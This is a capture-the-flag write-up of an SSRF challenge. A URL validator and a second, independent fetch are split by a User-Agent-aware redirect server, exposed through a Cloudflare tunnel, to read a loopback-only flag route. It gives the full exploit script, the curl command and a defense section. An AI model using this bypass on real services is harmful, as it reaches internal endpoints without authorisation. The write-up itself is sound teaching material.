## Overview

**Saturn** is an Easy Web challenge: a "proxy service" that takes a URL, fetches it, and shows you the response. A `/secret` route holds the flag but only answers requests whose `remote_addr` is `127.0.0.1`. That's a textbook [Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html) setup — make the server fetch its own loopback endpoint for us. The twist is that the app uses the robust `SafeURL` library to block exactly that, so the whole challenge is finding the gap between *validation* and *fetch*.

## The technique

Here is the entire bug, visible in the source:

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url']
        try:
            su = safeurl.SafeURL()
            opt = safeurl.Options()
            opt.enableFollowLocation().setFollowLocationLimit(0)
            su.setOptions(opt)
            su.execute(url)          # VALIDATION request (pycurl)
        except:
            return render_template('index.html', error="Malicious input detected.")
        r = requests.get(url)        # ACTUAL fetch (requests), on the raw url
        return render_template('index.html', result=r.text)

@app.route('/secret')
def secret():
    if request.remote_addr == '127.0.0.1':
        return render_template('secret.html', SECRET=open('./flag.txt').readline())
    return render_template('forbidden.html'), 403
```

The obvious payload `url=http://127.0.0.1:1337/secret` is rejected. `SafeURL` is genuinely good: it resolves the hostname and checks **every** resolved IP against a blacklist (`127.0.0.0/8`, `0.0.0.0/8`, `10/8`, `169.254/16`, `192.168/16`, …), its pycurl socket callback re-validates the **actual IP it connects to**, and `setFollowLocationLimit(0)` is treated as *unlimited* redirect-follow with **each hop re-validated**. You cannot reach loopback *through SafeURL*.

But you don't have to. `su.execute(url)` is used only as a yes/no gate — the bytes that get rendered come from a **second, independent** `requests.get(url)` on the same URL. Two different HTTP clients, two separate network requests, and `requests` follows redirects on its own. That's a [time-of-check/time-of-use](https://cwe.mitre.org/data/definitions/367.html) desync: the request that is *checked* is not the request that is *used*.

The two clients are trivially distinguishable — `requests` sends `User-Agent: python-requests/2.31.0`; SafeURL's pycurl probe does not. So we host a server that answers each one differently:

```python
def do_GET(self):
    if "python-requests" in self.headers.get("User-Agent", ""):
        self.send_response(302)                                   # the real fetch
        self.send_header("Location", "http://127.0.0.1:1337/secret")
        self.end_headers()
    else:
        self.send_response(200); self.end_headers()               # SafeURL's validation probe
        self.wfile.write(b"ok")
```

- SafeURL's probe gets a plain `200` — a public host over HTTPS on port 443, no redirect to follow, so validation **passes**.
- `requests` gets a `302 -> http://127.0.0.1:1337/secret`, follows it, and hits `/secret` **from the server itself** (`remote_addr == 127.0.0.1`). The flag is reflected straight back into the result page.

(Discriminating by request **order** works just as well — the validator always fires first, so "1st request → 200, 2nd request → 302" needs no User-Agent check.)

## Solution

The challenge box is behind NAT, so it can't dial back to a local listener directly. A **Cloudflare quick tunnel** exposes the redirect server with a clean public URL — and unlike `localhost.run` / `pinggy` / `srv.us`, it injects no `safebrowse.io` interstitial `302` that would hijack our redirect.

Run the redirect server locally:

`redirect_server.py`:

```python
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

TARGET = sys.argv[1]                 # http://127.0.0.1:1337/secret
PORT = int(sys.argv[2])

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if "python-requests" in self.headers.get("User-Agent", ""):
            self.send_response(302)
            self.send_header("Location", TARGET)
            self.end_headers()
        else:
            self.send_response(200); self.end_headers()
            self.wfile.write(b"ok")
    def log_message(self, *a): pass

HTTPServer(("127.0.0.1", PORT), H).serve_forever()
```

Then expose it and fire the SSRF:

```bash
python3 redirect_server.py http://127.0.0.1:1337/secret 8765 &
cloudflared tunnel --url http://localhost:8765 --no-autoupdate
# -> https://<rand>.trycloudflare.com

curl -s "http://<target>/" --data-urlencode "url=https://<rand>.trycloudflare.com/" | grep -oE "HTB\{[^}]+\}"
# -> HTB{...}
```

The proxy validates the tunnel URL (public, allowed), then re-fetches it, follows the `302` into `127.0.0.1:1337/secret`, and reflects the flag back. Flag value redacted.

## Why it worked

Two components that are each safe in isolation were wired together unsafely: a strict SSRF validator and a permissive fetcher, arranged so the thing that is checked is not the thing that is used. Any time a security decision is made against input that is re-read or re-fetched later, the check is only advisory. Here the time-of-check client and the time-of-use client even differed in redirect behaviour and User-Agent, which is what made the split exploitable with a single-file server.

## Fix / defense

- **Check the thing you use.** Fetch with the validated client only, or fetch the resolved/pinned IP the validator approved — never re-issue `requests.get(raw_url)` after validating.
- Disable redirect following on the actual fetch: `requests.get(url, allow_redirects=False)`, or re-validate every hop with the same library.
- Don't treat `remote_addr == 127.0.0.1` as an authorization boundary — any SSRF-of-self defeats it. Gate `/secret` behind real authentication.
